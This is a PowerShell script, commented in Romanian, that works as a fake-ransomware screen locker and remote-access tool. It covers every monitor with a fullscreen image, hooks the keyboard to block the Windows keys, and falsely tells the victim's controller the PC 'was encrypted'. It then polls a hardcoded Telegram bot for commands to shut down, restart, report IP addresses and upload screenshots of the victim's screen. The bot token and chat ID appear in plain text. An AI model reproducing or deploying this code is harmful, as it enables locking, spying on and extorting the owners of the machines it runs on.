# VARIABILE
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatId = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME

# DESCARCA IMAGINE
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# TRIMITE MESAJ TELEGRAM
function Send-Telegram($msg) {
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body (@{
        chat_id = $chatId
        text    = $msg
    })
}

# ASCULTA COMENZI TELEGRAM SIMPLIFICAT
function Telegram-Listener {
    $lastUpdateId = 0
    $uriGet = "https://api.telegram.org/bot$botToken/getUpdates"

    while ($true) {
        try {
            $updates = Invoke-RestMethod "$uriGet?offset=$($lastUpdateId+1)&timeout=10"
            foreach ($update in $updates.result) {
                $lastUpdateId = $update.update_id
                $text = $update.message.text.Trim()

                switch ($text) {
                    "/unlock$user" {
                        Send-Telegram "🔓 PC-ul $user ($pc) a fost deblocat."
                        [Environment]::Exit(0)
                    }
                    "/shutdown$user" {
                        Send-Telegram "🛑 PC-ul $user ($pc) se inchide acum."
                        Stop-Computer -Force
                    }
                    "/restart$user" {
                        Send-Telegram "🔄 PC-ul $user ($pc) restarteaza acum."
                        Restart-Computer -Force
                    }
                    "/info$user" {
                        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
                            $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80'
                        })[0].IPAddress
                        $ipPublic = (Invoke-RestMethod "https://api.ipify.org")
                        Send-Telegram "💻 PC: $pc`n👤 User: $user`n🌐 IP local: $ipLocal`n🌍 IP public: $ipPublic"
                    }
                    "/screenshot$user" {
                        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                        $bmp = New-Object Drawing.Bitmap ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width), ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                        $graphics = [Drawing.Graphics]::FromImage($bmp)
                        $graphics.CopyFromScreen(0,0,0,0,$bmp.Size)
                        $screenshotPath = "$env:TEMP\screenshot.jpg"
                        $bmp.Save($screenshotPath, [Drawing.Imaging.ImageFormat]::Jpeg)

                        $uriPhoto = "https://api.telegram.org/bot$botToken/sendPhoto"
                        Invoke-RestMethod -Uri $uriPhoto -Method Post -Form @{
                            chat_id = $chatId
                            photo   = [System.IO.File]::OpenRead($screenshotPath)
                        }
                    }
                }
            }
        } catch {}
        Start-Sleep 2
    }
}

# BLOCARE TASTE
Add-Type @"
using System; using System.Runtime.InteropServices;
public class KeyboardMonitor {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;
    private const int WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100;
    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
    public static void BlockAndMonitor() { hookId = SetHook(proc); }
    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using(var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using(var curModule = curProcess.MainModule)
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if(nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            if(vkCode == 0x43) Environment.Exit(0);
            if(vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1;
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@
[KeyboardMonitor]::BlockAndMonitor()

# AFISARE FULLSCREEN
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screens = [System.Windows.Forms.Screen]::AllScreens
foreach ($screen in $screens) {
    $form = New-Object System.Windows.Forms.Form -Property @{
        WindowState='Maximized'; FormBorderStyle='None'; TopMost=$true; StartPosition='Manual';
        Location=$screen.Bounds.Location; Size=$screen.Bounds.Size; BackColor='Black'; KeyPreview=$true; Cursor=[System.Windows.Forms.Cursors]::None
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Dock='Fill'; Image=[Drawing.Image]::FromFile($tempImagePath); SizeMode='StretchImage'
    }
    $form.Controls.Add($pb)
    $form.Show()
}

# Mesaj Telegram initial cu comenzi directe
$msgStart = @"
PC-ul $user ($pc) a fost criptat cu succes!

/unlock$user
/shutdown$user
/restart$user
/screenshot$user
/info$user
"@
Send-Telegram $msgStart

# PORNIRE ASCULTARE TELEGRAM
Start-Job -ScriptBlock { Telegram-Listener }
[System.Windows.Forms.Application]::Run()
